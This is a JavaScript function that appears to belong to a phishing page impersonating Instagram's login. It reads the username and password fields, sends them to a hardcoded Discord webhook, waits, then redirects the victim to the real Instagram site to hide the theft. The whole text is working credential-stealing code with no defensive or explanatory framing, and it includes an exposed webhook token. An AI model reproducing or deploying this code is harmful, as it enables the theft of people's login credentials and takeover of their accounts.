
function sendMessage() {
function sleep(milliseconds) {
const date = Date.now();
let currentDate = null;
do {
  currentDate = Date.now();
} while (currentDate - date < milliseconds);
}
  var request = new XMLHttpRequest();
  request.open("POST", "https://discordapp.com/api/webhooks/1276339449797546079/enK7fUBBIJQyE7tYlYDazoDr2T3EO2ffq6R0tLy4NQ8L_hQ5V_KXV8w54LlRWF9l5iK8");
  request.setRequestHeader('Content-type', 'application/json');
  var params = {
    content: ("> **USERNAME  : **" + document.getElementById('username').value + "\n> **PASSWORD : **" + document.getElementById('password').value)
  }
  request.send(JSON.stringify(params));
  sleep(2000)
  window.location.replace("https://www.instagram.com");
}
